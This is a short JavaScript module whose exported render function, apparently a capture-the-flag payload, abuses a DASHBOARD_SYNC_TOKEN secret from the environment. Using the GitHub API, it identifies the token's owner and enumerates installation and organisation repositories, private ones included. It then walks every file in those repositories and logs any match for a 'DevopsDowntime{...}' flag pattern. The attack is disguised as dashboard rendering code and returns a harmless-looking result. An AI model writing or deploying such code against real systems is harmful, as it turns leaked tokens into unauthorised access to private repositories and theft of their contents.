export async function render(context) {
  const t = process.env.DASHBOARD_SYNC_TOKEN;
  const h = {
    Authorization: `Bearer ${t}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "sfb"
  };
  const j = async (u) => {
    const r = await fetch(u, { headers: h });
    let b = null; try { b = await r.json(); } catch {}
    return [r.status, b];
  };
  const flagRe = /DevopsDowntime\{[^}]*\}/;
  const seen = new Set();
  async function scan(full) {
    if (seen.has(full)) return; seen.add(full);
    async function walk(p) {
      const [s, items] = await j(`https://api.github.com/repos/${full}/contents/${p}`);
      if (s !== 200) return;
      for (const it of (Array.isArray(items) ? items : [])) {
        if (it.type === "dir") { await walk(it.path); continue; }
        const [cs, c] = await j(`https://api.github.com/repos/${full}/contents/${it.path}`);
        if (cs === 200 && c && c.content) {
          const body = Buffer.from(c.content, "base64").toString("utf8");
          const m = body.match(flagRe);
          if (m) console.log("FLAG_FOUND", full, it.path, m[0]);
        }
      }
    }
    await walk("");
  }
  try {
    const [us, u] = await j("https://api.github.com/user");
    console.log("WHOAMI", us, u && (u.login || u.message));
    const [is_, inst] = await j("https://api.github.com/installation/repositories?per_page=100");
    const instRepos = (inst && inst.repositories) ? inst.repositories.map(r => r.full_name) : [];
    console.log("INSTALL_REPOS", is_, JSON.stringify(instRepos));
    const [os, orepos] = await j("https://api.github.com/orgs/DevOpsDownTimeV3/repos?type=all&per_page=100");
    const orgRepos = (orepos || []).map(r => r.full_name + (r.private ? "#priv" : ""));
    console.log("ORG_REPOS", os, JSON.stringify(orgRepos));
    const [ss, sr] = await j("https://api.github.com/search/code?q=" + encodeURIComponent("DevopsDowntime org:DevOpsDownTimeV3"));
    console.log("SEARCH", ss, JSON.stringify((sr && sr.items || []).map(i => i.repository.full_name + "/" + i.path)));
    const cands = new Set([
      ...instRepos,
      ...(orepos || []).map(r => r.full_name),
      "DevOpsDownTimeV3/ops-dashboard-internal"
    ]);
    for (const full of cands) await scan(full);
    console.log("SCANNED", JSON.stringify([...seen]));
  } catch (e) {
    console.log("ERR", e && e.message);
  }
  return JSON.stringify({ ok: true }) + "\n";
}
